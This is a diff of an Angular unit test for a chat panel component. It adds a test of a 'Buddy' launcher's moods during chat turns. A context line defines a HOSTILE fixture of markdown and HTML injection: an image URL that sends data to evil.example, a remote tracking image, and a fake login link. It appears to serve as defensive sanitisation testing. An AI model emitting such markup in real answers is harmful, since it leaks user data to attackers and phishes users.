@@ -1,4 +1,5 @@
-import { TestBed } from '@angular/core/testing';
+import { ComponentFixture, TestBed } from '@angular/core/testing';
+import { By } from '@angular/platform-browser';
 import { provideHttpClient, withXhr } from '@angular/common/http';
 import { HttpTestingController, provideHttpClientTesting } from '@angular/common/http/testing';
 import { Router, provideRouter } from '@angular/router';
@@ -6,6 +7,7 @@ import { TranslateModule } from '@ngx-translate/core';
 import { ChatPanelComponent } from './chat-panel.component';
 import { ChatStore } from '../../../core/chat/chat.store';
 import { ChatMessage } from '../../../core/models/chat.model';
+import { BuddyComponent } from '../buddy/buddy.component';
 
 const HOSTILE = 'Se mere: ![x](https://evil.example/?cv=data) <img src="https://evil.example/p">'
   + ' [klik](https://evil.example/login)';
@@ -26,6 +28,9 @@ const ANSWER: ChatMessage = {
 describe('ChatPanelComponent', () => {
   let panel: HTMLElement;
   let navigate: jasmine.Spy;
+  let fixture: ComponentFixture<ChatPanelComponent>;
+  let backend: HttpTestingController;
+  let store: ChatStore;
 
   beforeEach(() => {
     TestBed.configureTestingModule({
@@ -33,9 +38,9 @@ describe('ChatPanelComponent', () => {
       providers: [provideRouter([]), provideHttpClient(withXhr()), provideHttpClientTesting()],
     });
     navigate = spyOn(TestBed.inject(Router), 'navigate').and.resolveTo(true);
-    const backend = TestBed.inject(HttpTestingController);
-    const store = TestBed.inject(ChatStore);
-    const fixture = TestBed.createComponent(ChatPanelComponent);
+    backend = TestBed.inject(HttpTestingController);
+    store = TestBed.inject(ChatStore);
+    fixture = TestBed.createComponent(ChatPanelComponent);
     fixture.detectChanges();
     backend.expectOne(r => r.method === 'GET' && r.url === '/api/v1/chats').flush([]);
     store.open('c1');
@@ -77,5 +82,27 @@ describe('ChatPanelComponent', () => {
     actionButtons()[1].click();
 
     expect(navigate).toHaveBeenCalledWith(['/jobs', 'j2']);
+  });
+
+  it('has the launcher Buddy think while a turn runs and react to how it ended', () => {
+    const launcher = () => fixture.debugElement.query(By.css('[data-chat-launcher] jb-buddy'))
+      .componentInstance as BuddyComponent;
+    expect(launcher().mood()).toBe('idle');
+
+    store.send('Hej');
+    fixture.detectChanges();
+    expect(launcher().mood()).toBe('thinking');
+
+    backend.expectOne(r => r.method === 'POST' && r.url === '/api/v1/chats/c1/messages')
+      .flush('event:delta\ndata:{"text":"Svar"}\n\nevent:done\ndata:{}\n\n');
+    backend.expectOne(r => r.method === 'GET' && r.url === '/api/v1/chats').flush([]);
+    fixture.detectChanges();
+    expect(launcher().mood()).toBe('cheer');
+
+    store.send('Igen');
+    backend.expectOne(r => r.method === 'POST' && r.url === '/api/v1/chats/c1/messages')
+      .flush('event:error\ndata:{"code":"NOT_LOGGED_IN"}\n\n');
+    fixture.detectChanges();
+    expect(launcher().mood()).toBe('error');
   });
 });
